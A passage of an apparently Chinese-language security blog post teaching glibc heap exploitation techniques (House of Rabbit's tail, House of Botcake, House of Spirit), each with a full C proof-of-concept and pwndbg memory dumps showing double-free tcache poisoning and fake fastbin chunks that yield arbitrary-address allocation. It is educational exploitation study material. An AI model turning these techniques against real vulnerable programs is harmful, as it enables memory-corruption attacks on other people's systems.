class="meta">#<span class="meta-keyword">if</span> (GLIBC_VERSION == 29)</span></span><br><span class="line"><span class="keyword">char</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">uint16_t</span> *counts = (<span class="keyword">char</span>*)(((<span class="keyword">unsigned</span> <span class="keyword">long</span>)p &amp; ~<span class="number">0xfff</span>) + <span class="number">0x10</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">counts[(<span class="built_in">size</span> + <span class="number">0x10</span> &gt;&gt; <span class="number">4</span>) - <span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>house of rabbit漏洞可以绕过堆块的地址随机化保护（ASLR）达到<strong>任意</strong>地址分配的效果，因此在存在sh的文件中可直接getshell。</p><h2 id="House-of-botcake"><a href="#House-of-botcake" class="headerlink" title="House_of_botcake"></a>House_of_botcake</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>house of botcake利用手法只需要程序存在double free即可。</p><p>首先填充 tcache bin 链表，然后使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表，然后利用堆块重叠将double free块的fd指针覆写为目标位置，再次malloc即可控制到目标位置，达到任意写操作。</p><h3 id="Poc-1"><a href="#Poc-1" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"House of botcake Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//禁用缓冲并使_FILE_IO不影响堆</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 准备目标</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"目标地址是 %p.\n\n"</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"堆布局构造"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请7个 chunks(malloc(0x100)) 用于稍后填充tcache bin链表."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"为之后的合并申请一个 prev chunk"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请用于double free的 victim chunk."</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"malloc(0x100): a=%p.\n"</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"申请一个填充chunk防止top chunk合并.\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"接下来可以造成堆块重叠"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 1: 填充 tcache bin 链表"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 2: free victim chunk 并链接到 unsorted bin"</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 3: free prev chunk 使它和 victim chunk 合并."</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Step 4: 使用malloc从tcache bin链表中取出一个chunk，然后通过二次free将 victim chunk 加入tcache bin链表\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"double free 利用完成\n\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"tcache 毒化"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"现在 victim chunk 被包含在一个更大的已释放块中，可以通过利用块重叠进行 tcache 毒化"</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"将 victim chunk 的 fd 指针覆写为目标位置"</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"malloc申请到目标位置."</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"新申请的 chunk 位于 %p\n"</span>, c);</span><br><span class="line">    </span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"已控制目标位置!\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/29/ZhXN3Cfeyg6SvY7.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/29/ZhXN3Cfeyg6SvY7.png" class="lazyload"></a></p><h3 id="分步分析-1"><a href="#分步分析-1" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-堆内布局构造"><a href="#1-堆内布局构造" class="headerlink" title="1 堆内布局构造"></a>1 堆内布局构造</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50xg 0x555555559f20-0x20</span><br><span class="line">                       ...</span><br><span class="line">0x555555559f00:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f10:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f20:0x00000000000000000x0000000000000111 &lt;&#x3D;&#x3D;&#x3D;&#x3D; victim chunk</span><br><span class="line">0x555555559f30:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f40:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f50:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f60:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f70:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f80:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f90:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fa0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fb0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fc0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fd0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559fe0:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559ff0:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a000:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a030:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 防止合并</span><br><span class="line">0x55555555a040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a050:0x00000000000000000x000000000001ffb1 &lt;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">0x55555555a060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="2-填充-tcache-bin-链表"><a href="#2-填充-tcache-bin-链表" class="headerlink" title="2 填充 tcache bin 链表"></a>2 填充 tcache bin 链表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line"><span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br></pre></td></tr></table></figure></div><h4 id="3-free-victim-chunk-并链接到-unsorted-bin"><a href="#3-free-victim-chunk-并链接到-unsorted-bin" class="headerlink" title="3 free victim chunk 并链接到 unsorted bin"></a>3 free victim chunk 并链接到 unsorted bin</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559f20 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559f20</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></div><h4 id="4-free-prev-chunk-使它和-victim-chunk-合并"><a href="#4-free-prev-chunk-使它和-victim-chunk-合并" class="headerlink" title="4 free prev chunk 使它和 victim chunk 合并"></a>4 free prev chunk 使它和 victim chunk 合并</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(prev);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins </span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555559d10 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555559e10 —▸ 0x7ffff7faebe0 (main_arena+96) ◂— 0x555555559e10    &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 合并</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></div><h4 id="5-使用malloc从tcache-bin链表中取出一个chunk，double-free将-victim-chunk-加入tcache-bin链表"><a href="#5-使用malloc从tcache-bin链表中取出一个chunk，double-free将-victim-chunk-加入tcache-bin链表" class="headerlink" title="5 使用malloc从tcache bin链表中取出一个chunk，double free将 victim chunk 加入tcache bin链表"></a>5 使用malloc从tcache bin链表中取出一个chunk，double free将 victim chunk 加入tcache bin链表</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(a);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">0x110 [  6]: 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0                &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; malloc取出</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; tcachebins </span><br><span class="line">0x110 [  7]: 0x555555559f30 —▸ 0x555555559c00 —▸ 0x555555559af0 —▸ 0x5555555599e0 —▸ 0x5555555598d0 —▸ 0x5555555597c0 —▸ 0x5555555596b0 ◂— 0x0          &lt;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; double free加入</span><br><span class="line">0x410 [  1]: 0x5555555592a0 ◂— 0x0</span><br></pre></td></tr></table></figure></div><h4 id="6-利用堆块重叠将-victim-chunk-的-fd-指针覆写为目标位置"><a href="#6-利用堆块重叠将-victim-chunk-的-fd-指针覆写为目标位置" class="headerlink" title="6 利用堆块重叠将 victim chunk 的 fd 指针覆写为目标位置"></a>6 利用堆块重叠将 victim chunk 的 fd 指针覆写为目标位置</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line"></span><br><span class="line">b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50xg 0x555555559f20-0x20</span><br><span class="line">0x555555559f00:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f10:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f20:0x00000000000000000x0000000000000111</span><br><span class="line">0x555555559f30:0x00007fffffffdb000x0000555555559010 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 堆块重叠，写入fd</span><br><span class="line">0x555555559f40:0x00000000000000000x00000000000000f1</span><br><span class="line">0x555555559f50:0x00007ffff7faebe00x00007ffff7faebe0</span><br><span class="line">0x555555559f60:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555559f70:0x00000000000000000x0000000000000000</span><br><span class="line">                       ...</span><br><span class="line">0x55555555a010:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a020:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a030:0x00000000000000f00x0000000000000020</span><br><span class="line">0x55555555a040:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a050:0x00000000000000000x000000000001ffb1 &lt;&#x3D;&#x3D;&#x3D;&#x3D; top chunk</span><br><span class="line">0x55555555a060:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a070:0x00000000000000000x0000000000000000</span><br><span class="line">0x55555555a080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="7-malloc申请到目标位置"><a href="#7-malloc申请到目标位置" class="headerlink" title="7 malloc申请到目标位置"></a>7 malloc申请到目标位置</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/29/Nom3x27sBWDYOvX.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/29/Nom3x27sBWDYOvX.png" class="lazyload"></a></p><h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>该利用可以bypass double free的check，达到任意地址写，测试发现glibc2.30版本也可以利用。</p><h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>通过伪造fastbin，再将一个目前可用的chunk的指针改写为伪造fastbin地址，将这个chunk free，相当于free一个假的fastbin堆块，然后再下次malloc的时候就会返回该假堆块。</p><h3 id="Poc-2"><a href="#Poc-2" class="headerlink" title="Poc"></a>Poc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"House of Spirit Poc\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step1: malloc初始化堆内存\n\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step2: 覆盖一个堆指针指向伪造的 fastbin 区域\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t这片区域 (长度为: %lu) 包含两个 fake chunk.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第一个fake chunk位于 %p\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第二个fake chunk位于 %p\n"</span>, &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t第二个fake chunk 的size必须大于 2*SIZE_SZ (x64上 &gt; 16) &amp;&amp; 小于 av-&gt;system_mem，用于绕过nextsize检查\n"</span>);</span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t覆盖堆指针指向第一个fake chunk %p \n\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step3: free被覆盖堆指针的堆\n\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Step4: malloc申请到fake chunk\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\t再次malloc将会在 %p 返回fake chunk %p \n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\tmalloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><a href="https://i.loli.net/2020/01/30/dPT1qpWfKYEFIiC.png" data-fancybox="group" data-caption="image.png" class="fancybox"><img alt="image.png" title="image.png" data-src="https://i.loli.net/2020/01/30/dPT1qpWfKYEFIiC.png" class="lazyload"></a></p><h3 id="分步分析-2"><a href="#分步分析-2" class="headerlink" title="分步分析"></a>分步分析</h3><h4 id="1-malloc初始化堆内存"><a href="#1-malloc初始化堆内存" class="headerlink" title="1 malloc初始化堆内存"></a>1 malloc初始化堆内存</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x20fe1</span><br><span class="line">&#125;</span><br><span class="line">0x602020 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135137, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10xg 0x602020-0x20</span><br><span class="line">0x602000:0x00000000000000000x0000000000000021 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 改写目标chunk</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000020fe1</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><h4 id="2-覆盖一个堆指针指向伪造的-fastbin-区域"><a href="#2-覆盖一个堆指针指向伪造的-fastbin-区域" class="headerlink" title="2 覆盖一个堆指针指向伪造的 fastbin 区域"></a>2 覆盖一个堆指针指向伪造的 fastbin 区域</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; </span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; 